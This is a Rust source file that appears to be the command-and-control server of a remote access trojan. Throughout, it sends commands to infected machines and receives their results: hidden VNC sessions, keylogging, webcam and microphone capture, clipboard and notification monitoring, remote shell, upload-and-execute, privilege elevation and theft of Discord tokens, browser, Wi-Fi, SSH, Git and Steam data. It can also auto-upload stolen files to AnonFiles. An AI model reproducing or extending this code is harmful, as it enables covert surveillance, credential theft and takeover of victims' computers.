use tauri::{AppHandle, Emitter};

use std::collections::HashMap;
use std::net::SocketAddr;
use tokio::sync::mpsc::{Receiver, Sender};

use std::sync::{Arc, Mutex};

use base64::{engine::general_purpose, Engine as _};
use rsa::pkcs8::EncodePublicKey;
use rsa::rand_core::OsRng;
use rsa::{RsaPrivateKey, RsaPublicKey};

use crate::commands::*;
use anyhow::{Context, Result};
use common::packets::*;
use common::RSA_BITS;

use crate::utils::encryption::{handle_encryption_confirm, handle_encryption_request};
use crate::utils::logger::Logger;
use common::client_info::ClientInfo;

pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
    log_events: Logger,
    country_reader: maxminddb::Reader<Vec<u8>>,
    auto_upload_anonfiles: bool,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let get_exe_path = std::env::current_exe().unwrap();
        let exe_parent = get_exe_path.parent().unwrap();
        let resources_path = exe_parent.join("resources");

        let country_reader =
            maxminddb::Reader::open_readfile(resources_path.join("countries.mmdb")).unwrap();

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
            reverse_proxy_tasks: HashMap::new(),
            log_events: Logger::new(),
            country_reader,
            auto_upload_anonfiles: false,
        };

        s.channel_loop().await;

        Ok(())
    }

    // Helper method for common command logging and execution
    async fn handle_command(&mut self, addr: &SocketAddr, packet: ClientboundPacket) {
        println!("Handling command: {:?}", packet.get_type());
        println!("Packet: {:?}", packet);
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events
                .log(
                    "cmd_sent",
                    format!(
                        "Executed {} on client [{}] [{}]",
                        packet.get_type(),
                        addr,
                        client.system.username
                    ),
                )
                .await;
            self.send_client_packet(addr, packet.clone()).await;
        }
    }

    // Helper method for handling client data responses
    async fn handle_client_data(
        &mut self,
        addr: &SocketAddr,
        data_type: &str,
        event: &str,
        payload: serde_json::Value,
    ) {
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events
                .log(
                    "cmd_rcvd",
                    format!(
                        "Received {} from client [{}] [{}]",
                        data_type, addr, client.system.username
                    ),
                )
                .await;
            self.emit_serde_payload(event, payload).await;
        }
    }

    async fn emit_client_status(&self, client_info: &ClientInfo, status: &str) {
        let payload = serde_json::json!(client_info);
        self.emit_serde_payload(status, payload).await;
    }

    async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
        if let Some(handle) = &self.tauri_handle {
            handle
                .lock()
                .unwrap()
                .emit(event, payload)
                .unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
        } else {
            println!("Cannot send payload event: Tauri handle not set");
        }
    }

    async fn send_client_packet(&self, addr: &SocketAddr, packet: ClientboundPacket) {
        if let Some(tx) = self.txs.get(addr) {
            tx.send(ClientCommand::Write(packet.clone()))
                .await
                .unwrap_or_else(|e| {
                    println!("Failed to send packet {:?}: {}", packet.get_type(), e)
                });
        }
    }

    async fn get_country_code(&self, addr: &SocketAddr) -> String {
        let country = self
            .country_reader
            .lookup::<maxminddb::geoip2::Country>(addr.ip())
            .unwrap();
        if let Some(country) = country {
            country.country.unwrap().iso_code.unwrap().to_string()
        } else {
            "N/A".to_string()
        }
    }

    async fn channel_loop(mut self) {
        while let Some(p) = self.receiver.recv().await {
            use crate::commands::ServerCommand::*;

            match p {
                Log(log) => self.log_events.log_once(log).await,

                CloseClientSessions() => {
                    for (addr, tx) in self.txs.iter_mut() {
                        tx.send(ClientCommand::Close).await.unwrap();
                        self.reverse_proxy_tasks.remove(&addr);
                    }
                    self.txs.clear();
                    self.connected_users.clear();
                    self.reverse_proxy_tasks.clear();
                    self.log_events
                        .log("server_stopped", "Server stopped!".to_string())
                        .await;
                }

                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                    self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                }

                EncryptionRequest(tx, otx) => {
                    handle_encryption_request(
                        tx,
                        otx,
                        self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                    )
                    .await;
                }

                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    handle_encryption_confirm(tx, otx, enc_s, enc_t, exp_t, self.priv_key.clone())
                        .await;
                }

                RegisterClient(tx, addr, mut client_info) => {
                    self.txs.insert(addr, tx);
                    client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
                    client_info.data.addr = Some(addr.to_string());
                    client_info.data.country_code = self.get_country_code(&addr).await;

                    self.connected_users.insert(addr, client_info.clone());

                    self.log_events
                        .log(
                            "client_connected",
                            format!(
                                "Client [{}] {} connected!",
                                addr, client_info.system.username
                            ),
                        )
                        .await;
                    self.emit_client_status(&client_info, "client_connected")
                        .await;
                }

                ClientDisconnected(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "client_disconnected",
                                format!(
                                    "Client [{}] [{}] disconnected",
                                    addr, client.system.username
                                ),
                            )
                            .await;
                        self.emit_client_status(&client, "client_disconnected")
                            .await;
                    }

                    let tx = self.txs.get(&addr);

                    if let Some(tx) = tx {
                        tx.send(ClientCommand::Close).await.unwrap();
                    }

                    self.txs.remove(&addr);
                    self.reverse_proxy_tasks.remove(&addr);
                    self.connected_users.remove(&addr);
                }

                VisitWebsite(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::VisitWebsite(data))
                        .await
                }

                ShowMessageBox(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::ShowMessageBox(data))
                        .await
                }

                ShowInputBox(addr, data) => {
                    self.handle_command(&addr, ClientboundPacket::ShowInputBox(data))
                        .await;
                }

                InputBoxResult(addr, result) => {
                    if let Some(_client) = self.connected_users.get(&addr) {
                        self.emit_serde_payload(
                            "inputbox_result",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "result": result
                            }),
                        )
                        .await;
                    }
                }

                ElevateClient(addr) => {
                    self.handle_command(&addr, ClientboundPacket::ElevateClient)
                        .await
                }

                TakeScreenshot(addr, display) => {
                    self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
                        .await
                }

                GetProcessList(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetProcessList)
                        .await
                }

                KillProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::KillProcess(process))
                        .await
                }

                SuspendProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::SuspendProcess(process))
                        .await
                }

                ResumeProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::ResumeProcess(process))
                        .await
                }

                StartProcess(addr, process) => {
                    self.handle_command(&addr, ClientboundPacket::StartProcess(process))
                        .await
                }

                StartShell(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StartShell)
                        .await
                }

                ExitShell(addr) => {
                    self.handle_command(&addr, ClientboundPacket::ExitShell)
                        .await
                }

                ShellCommand(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::ShellCommand(command))
                        .await
                }

                StartRemoteDesktop(addr, config) => {
                    self.handle_command(&addr, ClientboundPacket::StartRemoteDesktop(config))
                        .await
                }

                StopRemoteDesktop(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopRemoteDesktop)
                        .await;
                    let reset_input = KeyboardInputData {
                        key_code: 0,
                        character: "".to_string(),
                        is_keydown: false,
                        shift_pressed: false,
                        ctrl_pressed: false,
                        caps_lock: false,
                    };
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(reset_input))
                        .await;
                }

                StartRemoteDesktopAudio(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StartRemoteDesktopAudio)
                        .await
                }

                StopRemoteDesktopAudio(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StopRemoteDesktopAudio)
                        .await
                }

                RequestMicDevices(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::RequestMicDevices)
                        .await
                }

                RequestDiscordTokens(addr) => {
                    println!("Server sending RequestDiscordTokens to {}", addr);
                    self.send_client_packet(&addr, ClientboundPacket::RequestDiscordTokens)
                        .await
                }

                StartMicLive(addr, device_id) => {
                    self.send_client_packet(&addr, ClientboundPacket::StartMicLive(device_id))
                        .await
                }

                StopMicLive(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StopMicLive)
                        .await
                }

                StartMicRecording(addr, device_id) => {
                    self.send_client_packet(&addr, ClientboundPacket::StartMicRecording(device_id))
                        .await
                }

                StopMicRecording(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StopMicRecording)
                        .await
                }

                StartDesktopRecording(addr, config) => {
                    self.send_client_packet(&addr, ClientboundPacket::StartDesktopRecording(config))
                        .await
                }

                StopDesktopRecording(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StopDesktopRecording)
                        .await
                }

                RequestWebcam(addr) => {
                    self.handle_command(&addr, ClientboundPacket::RequestWebcam)
                        .await
                }

                ManageSystem(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::ManageSystem(command.clone()))
                        .await
                }

                DownloadFile(addr, path) => {
                    self.handle_command(&addr, ClientboundPacket::DownloadFile(path))
                        .await
                }

                MouseClick(addr, data) => {
                    self.send_client_packet(&addr, ClientboundPacket::MouseClick(data))
                        .await
                }
                KeyboardInput(addr, data) => {
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(data))
                        .await
                }
                PreviousDir(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::PreviousDir)
                        .await
                }
                ViewDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::ViewDir(path))
                        .await
                }
                AvailableDisks(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::AvailableDisks)
                        .await
                }
                RefreshDir(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::RefreshDir)
                        .await
                }
                RemoveDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path))
                        .await
                }
                RemoveFile(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path))
                        .await
                }
                DisconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Disconnect)
                        .await
                }
                ReconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Reconnect)
                        .await
                }

                StartHVNC(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_sent",
                                format!(
                                    "Starting HVNC on client [{}] [{}]",
                                    addr, client.system.username
                                ),
                            )
                            .await;
                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC)
                            .await
                    }
                }
                StopHVNC(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_sent",
                                format!(
                                    "Stopping HVNC on client [{}] [{}]",
                                    addr, client.system.username
                                ),
                            )
                            .await;
                        self.send_client_packet(&addr, ClientboundPacket::StopHVNC)
                            .await
                    }
                }
                StartHVNCFrameAudio(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StartHVNCFrameAudio)
                        .await
                }
                StopHVNCFrameAudio(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::StopHVNCFrameAudio)
                        .await
                }
                OpenExplorer(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::OpenExplorer)
                        .await
                }
                OpenHVNCProcess(addr, process_name) => {
                    self.send_client_packet(&addr, ClientboundPacket::OpenHVNCProcess(process_name))
                        .await
                }

                UploadAndExecute(addr, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_sent",
                                format!(
                                    "Uploading and executing file {} to client [{}] [{}]",
                                    file_data.name, addr, client.system.username
                                ),
                            )
                            .await;
                        self.send_client_packet(
                            &addr,
                            ClientboundPacket::UploadAndExecute(file_data),
                        )
                        .await;
                    }
                }

                ExecuteFile(addr, path) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_sent",
                                format!(
                                    "Executing file {} on client [{}] [{}]",
                                    path, addr, client.system.username
                                ),
                            )
                            .await;
                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path))
                            .await;
                    }
                }

                UploadFile(addr, target_folder, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_sent",
                                format!(
                                    "Uploading file {} to folder {} on client [{}] [{}]",
                                    file_data.name, target_folder, addr, client.system.username
                                ),
                            )
                            .await;
                        self.send_client_packet(
                            &addr,
                            ClientboundPacket::UploadFile(target_folder, file_data),
                        )
                        .await;
                    }
                }

                HVNCFrame(addr, data) => {
                    println!("HVNCFrame received from {}", addr);
                    self.emit_serde_payload(
                        "hvnc_frame",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": general_purpose::STANDARD.encode(&data)
                        }),
                    )
                    .await;
                }

                HVNCFrameAudioChunk(addr, chunk) => {
                    self.emit_serde_payload(
                        "hvnc_frame_audio_chunk",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": chunk.timestamp,
                            "sampleRate": chunk.sample_rate,
                            "channels": chunk.channels,
                            "data": general_purpose::STANDARD.encode(&chunk.data),
                        }),
                    )
                    .await;
                }

                ScreenshotData(addr, data) => {
                    if let Some(_client) = self.connected_users.get(&addr) {
                        self.emit_serde_payload(
                            "client_screenshot",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&data.data))
                            }),
                        ).await;
                    }
                }

                ProcessList(addr, process_list) => {
                    self.handle_client_data(
                        &addr,
                        "process list",
                        "process_list",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "processes": process_list.processes.clone()
                        }),
                    )
                    .await;
                }

                ShellOutput(addr, output) => {
                    self.handle_client_data(
                        &addr,
                        "shell output",
                        "client_shellout",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "shell_output": output.clone()
                        }),
                    )
                    .await;
                }

                RemoteDesktopFrame(addr, frame) => {
                    self.emit_serde_payload(
                        "remote_desktop_frame",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": frame.timestamp,
                            "display": frame.display,
                            "data": general_purpose::STANDARD.encode(&frame.data),
                        }),
                    )
                    .await;
                }

                RemoteDesktopAudioChunk(addr, chunk) => {
                    self.emit_serde_payload(
                        "remote_desktop_audio_chunk",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": chunk.timestamp,
                            "sampleRate": chunk.sample_rate,
                            "channels": chunk.channels,
                            "data": general_purpose::STANDARD.encode(&chunk.data),
                        }),
                    )
                    .await;
                }

                MicAudioChunk(addr, chunk) => {
                    self.emit_serde_payload(
                        "mic_audio_chunk",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": chunk.timestamp,
                            "sampleRate": chunk.sample_rate,
                            "channels": chunk.channels,
                            "data": general_purpose::STANDARD.encode(&chunk.data),
                        }),
                    )
                    .await;
                }

                MicRecordingFile(addr, file_data) => {
                    let transfer_id = format!(
                        "mic_recording_{}_{}",
                        addr.to_string().replace(":", "_"),
                        file_data.name
                    );
                    let total = file_data.data.len();
                    let start_time = std::time::Instant::now();

                    self.emit_serde_payload(
                        "file_transfer_start",
                        serde_json::json!({
                            "id": transfer_id,
                            "addr": addr.to_string(),
                            "filename": file_data.name,
                            "total": total,
                            "status": "started",
                        }),
                    )
                    .await;

                    self.emit_serde_payload(
                        "mic_recording_file",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "name": file_data.name,
                            "data": general_purpose::STANDARD.encode(&file_data.data),
                        }),
                    )
                    .await;

                    let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
                    let speed = (total as f64 / elapsed).round() as u64;
                    self.emit_serde_payload(
                        "file_transfer_complete",
                        serde_json::json!({
                            "id": transfer_id,
                            "addr": addr.to_string(),
                            "filename": file_data.name,
                            "total": total,
                            "speed": speed,
                            "data": general_purpose::STANDARD.encode(&file_data.data),
                        }),
                    )
                    .await;
                }

                DesktopRecordingPreviewFrame(addr, frame) => {
                    self.emit_serde_payload(
                        "desktop_recording_preview",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "timestamp": frame.timestamp,
                            "display": frame.display,
                            "width": frame.width,
                            "height": frame.height,
                            "data": general_purpose::STANDARD.encode(&frame.data),
                        }),
                    )
                    .await;
                }

                DesktopRecordingFile(addr, file_data) => {
                    let transfer_id = format!(
                        "desktop_recording_{}_{}",
                        addr.to_string().replace(":", "_"),
                        file_data.name
                    );
                    let total = file_data.data.len();
                    let start_time = std::time::Instant::now();

                    self.emit_serde_payload(
                        "file_transfer_start",
                        serde_json::json!({
                            "id": transfer_id,
                            "addr": addr.to_string(),
                            "filename": file_data.name,
                            "total": total,
                            "status": "started",
                        }),
                    )
                    .await;

                    self.emit_serde_payload(
                        "desktop_recording_file",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "name": file_data.name,
                            "data": general_purpose::STANDARD.encode(&file_data.data),
                        }),
                    )
                    .await;

                    let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
                    let speed = (total as f64 / elapsed).round() as u64;
                    self.emit_serde_payload(
                        "file_transfer_complete",
                        serde_json::json!({
                            "id": transfer_id,
                            "addr": addr.to_string(),
                            "filename": file_data.name,
                            "total": total,
                            "speed": speed,
                            "data": general_purpose::STANDARD.encode(&file_data.data),
                        }),
                    )
                    .await;
                }

                MicDeviceList(addr, devices) => {
                    self.emit_serde_payload(
                        "mic_device_list",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "devices": devices,
                        }),
                    )
                    .await;
                }

                WebcamResult(addr, frame) => {
                    if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
                        self.emit_serde_payload(
                            "webcam_result",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&jpeg_data)),
                            }),
                        ).await;
                    }
                }

                FileList(addr, files) => {
                    self.emit_serde_payload(
                        "files_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "files": files
                        }),
                    )
                    .await;
                }

                CurrentFolder(addr, path) => {
                    self.emit_serde_payload(
                        "current_folder",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "path": path
                        }),
                    )
                    .await;
                }

                DisksResult(addr, disks) => {
                    let files = disks
                        .iter()
                        .map(|disk| File {
                            file_type: "dir".to_string(),
                            name: format!("{}:\\", disk),
                        })
                        .collect::<Vec<_>>();

                    self.emit_serde_payload(
                        "files_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "files": files
                        }),
                    )
                    .await;
                }

                DownloadFileResult(addr, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events
                            .log(
                                "cmd_rcvd",
                                format!(
                                    "Downloaded file {} from client [{}] [{}]",
                                    file_data.name, addr, client.system.username
                                ),
                            )
                            .await;
                        let transfer_id = format!(
                            "download_file_{}_{}",
                            addr.to_string().replace(":", "_"),
                            file_data.name
                        );
                        let total = file_data.data.len();
                        let start_time = std::time::Instant::now();

                        self.emit_serde_payload(
                            "file_transfer_start",
                            serde_json::json!({
                                "id": transfer_id,
                                "addr": addr.to_string(),
                                "filename": file_data.name,
                                "total": total,
                                "status": "started",
                            }),
                        )
                        .await;

                        self.emit_serde_payload(
                            "download_file_result",
                            serde_json::json!({
                                "addr": addr.to_string(),
                                "name": file_data.name,
                                "data": general_purpose::STANDARD.encode(&file_data.data),
                            }),
                        )
                        .await;

                        let elapsed = start_time.elapsed().as_secs_f64().max(0.000_001);
                        let speed = (total as f64 / elapsed).round() as u64;
                        self.emit_serde_payload(
                            "file_transfer_complete",
                            serde_json::json!({
                                "id": transfer_id,
                                "addr": addr.to_string(),
                                "filename": file_data.name,
                                "total": total,
                                "speed": speed,
                                "data": general_purpose::STANDARD.encode(&file_data.data),
                            }),
                        )
                        .await;

                        if self.auto_upload_anonfiles {
                            let handle = self.tauri_handle.clone();
                            let data = file_data.data.clone();
                            let filename = file_data.name.clone();
                            tokio::spawn(async move {
                                match crate::utils::anonfiles::upload_to_anonfiles(&filename, data)
                                    .await
                                {
                                    Ok(url) => {
                                        if let Some(h) = handle {
                                            h.lock()
                                                .unwrap()
                                                .emit(
                                                    "server_log",
                                                    crate::utils::logger::Log {
                                                        event_type: "server_info".to_string(),
                                                        message: format!(
                                                            "Auto-uploaded file {} to: {}",
                                                            filename, url
                                                        ),
                                                    },
                                                )
                                                .ok();
                                        }
                                    }
                                    Err(e) => {
                                        if let Some(h) = handle {
                                            h.lock()
                                                .unwrap()
                                                .emit(
                                                    "server_log",
                                                    crate::utils::logger::Log {
                                                        event_type: "server_error".to_string(),
                                                        message: format!(
                                                            "Failed to auto-upload file {}: {}",
                                                            filename, e
                                                        ),
                                                    },
                                                )
                                                .ok();
                                        }
                                    }
                                }
                            });
                        }
                    }
                }

                GetClients(resp) => {
                    resp.send(self.connected_users.values().cloned().collect())
                        .ok();
                }

                GetClient(addr, resp) => {
                    resp.send(self.connected_users.get(&addr).cloned()).ok();
                }

                StartReverseProxy(addr, port, local_port) => {
                    self.handle_command(&addr, ClientboundPacket::StartReverseProxy(port.clone()))
                        .await;
                    if let Some(task) =
                        crate::utils::reverse_proxy::start_reverse_proxy(port, local_port).await
                    {
                        self.reverse_proxy_tasks.insert(addr, task);
                    }
                }

                StopReverseProxy(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopReverseProxy)
                        .await;
                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                        task.abort();
                    }
                    self.reverse_proxy_tasks.remove(&addr);
                }

                HandleTroll(addr, command) => {
                    self.handle_command(&addr, ClientboundPacket::TrollClient(command))
                        .await;
                }

                StartKeylogger(addr, realtime) => {
                    self.handle_command(&addr, ClientboundPacket::StartKeylogger(realtime))
                        .await;
                }

                StopKeylogger(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopKeylogger)
                        .await;
                }

                GetOfflineLogs(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetOfflineLogs)
                        .await;
                }

                ClearOfflineLogs(addr) => {
                    self.handle_command(&addr, ClientboundPacket::ClearOfflineLogs)
                        .await;
                }

                KeyloggerUpdate(addr, update) => {
                    self.emit_serde_payload(
                        "keylogger_update",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "window": update.window_title,
                            "data": update.key_data
                        }),
                    )
                    .await;
                }

                KeyloggerOfflineLogs(addr, logs) => {
                    self.emit_serde_payload(
                        "keylogger_offline_logs",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "logs": logs
                        }),
                    )
                    .await;
                }

                BrowserData(addr, data) => {
                    self.emit_serde_payload(
                        "browser_data",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data
                        }),
                    )
                    .await;

                    if self.auto_upload_anonfiles {
                        let json_data = serde_json::to_vec_pretty(&data).unwrap_or_default();
                        let filename =
                            format!("browser_data_{}.json", addr.to_string().replace(":", "_"));
                        let handle = self.tauri_handle.clone();
                        tokio::spawn(async move {
                            match crate::utils::anonfiles::upload_to_anonfiles(&filename, json_data)
                                .await
                            {
                                Ok(url) => {
                                    if let Some(h) = handle {
                                        h.lock()
                                            .unwrap()
                                            .emit(
                                                "server_log",
                                                crate::utils::logger::Log {
                                                    event_type: "server_info".to_string(),
                                                    message: format!(
                                                        "Auto-uploaded browser data to: {}",
                                                        url
                                                    ),
                                                },
                                            )
                                            .ok();
                                    }
                                }
                                Err(e) => {
                                    if let Some(h) = handle {
                                        h.lock()
                                            .unwrap()
                                            .emit(
                                                "server_log",
                                                crate::utils::logger::Log {
                                                    event_type: "server_error".to_string(),
                                                    message: format!(
                                                        "Failed to auto-upload browser data: {}",
                                                        e
                                                    ),
                                                },
                                            )
                                            .ok();
                                    }
                                }
                            }
                        });
                    }
                }

                DiscordTokenData(addr, data) => {
                    self.emit_serde_payload(
                        "discord_tokens",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "tokens": data.tokens,
                        }),
                    )
                    .await;
                }

                WifiData(addr, data) => {
                    self.emit_serde_payload(
                        "wifi_data",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                SoftwareInventory(addr, data) => {
                    self.emit_serde_payload(
                        "software_inventory",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                SoftwareIconResult(addr, data) => {
                    self.emit_serde_payload(
                        "software_icon_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                SoftwareActionResult(addr, data) => {
                    self.emit_serde_payload(
                        "software_action_result",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                GitData(addr, data) => {
                    self.emit_serde_payload(
                        "git_data",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                SSHData(addr, data) => {
                    self.emit_serde_payload(
                        "ssh_data",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                SteamData(addr, data) => {
                    self.emit_serde_payload(
                        "steam_data",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                ClipboardUpdate(addr, data) => {
                    self.emit_serde_payload(
                        "clipboard_update",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                ClipboardImageUpdate(addr, data) => {
                    self.emit_serde_payload(
                        "clipboard_image_update",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                NotificationEvent(addr, data) => {
                    self.emit_serde_payload(
                        "notification_event",
                        serde_json::json!({
                            "addr": addr.to_string(),
                            "data": data,
                        }),
                    )
                    .await;
                }

                GetBrowserData(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetBrowserData)
                        .await;
                }

                GetWifiData(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetWifiData)
                        .await;
                }

                GetSoftwareInventory(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetSoftwareInventory)
                        .await;
                }

                LaunchSoftware(addr, name) => {
                    self.handle_command(&addr, ClientboundPacket::LaunchSoftware(name))
                        .await;
                }

                UninstallSoftware(addr, name) => {
                    self.handle_command(&addr, ClientboundPacket::UninstallSoftware(name))
                        .await;
                }

                GetSoftwareIcon(addr, name) => {
                    self.handle_command(&addr, ClientboundPacket::GetSoftwareIcon(name))
                        .await;
                }

                GetGitData(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetGitData)
                        .await;
                }

                GetSSHData(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetSSHData)
                        .await;
                }

                GetSteamData(addr) => {
                    self.handle_command(&addr, ClientboundPacket::GetSteamData)
                        .await;
                }

                StartClipboardMonitor(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StartClipboardMonitor)
                        .await;
                }

                StopClipboardMonitor(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopClipboardMonitor)
                        .await;
                }

                StartNotificationCapture(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StartNotificationCapture)
                        .await;
                }

                StopNotificationCapture(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopNotificationCapture)
                        .await;
                }

                SetAutoUploadAnonFiles(enabled) => {
                    self.auto_upload_anonfiles = enabled;
                    self.log_events
                        .log(
                            "server_info",
                            format!("Auto upload to AnonFiles: {}", enabled),
                        )
                        .await;
                }
            }
        }
    }
}
